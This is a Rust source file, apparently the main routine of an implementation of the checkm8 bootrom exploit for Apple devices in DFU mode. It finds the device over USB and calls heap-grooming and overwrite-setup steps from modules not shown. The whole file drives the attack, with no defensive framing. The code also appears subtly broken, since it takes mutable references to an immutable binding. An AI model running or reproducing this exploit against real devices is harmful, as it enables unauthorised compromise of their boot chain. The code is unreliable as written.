mod checkm8;
mod usbexec;

use std::time::Duration;
use rusb::{Context, UsbContext};

use crate::{usbexec::reconnect_device, checkm8::{heap_grooming, setup_overwrite}};

fn main() {
    let vid: u16 = 0x5ac;
    let pid: u16 = 0x1227;
    println!("Looking for device VID:0x5AC PID:1227...");
    let context = Context::new().unwrap();
    let handle = context.open_device_with_vid_pid(vid, pid).expect("No device found");

    let handle = reconnect_device(&context, &mut handle, vid, pid, Duration::from_secs(1)).unwrap();

    println!("Grooming the Heaps...");
    heap_grooming(&context, &mut &handle, vid, pid);

    println!("Setup overwrite...");
    setup_overwrite(&context, handle, vid, pid)
}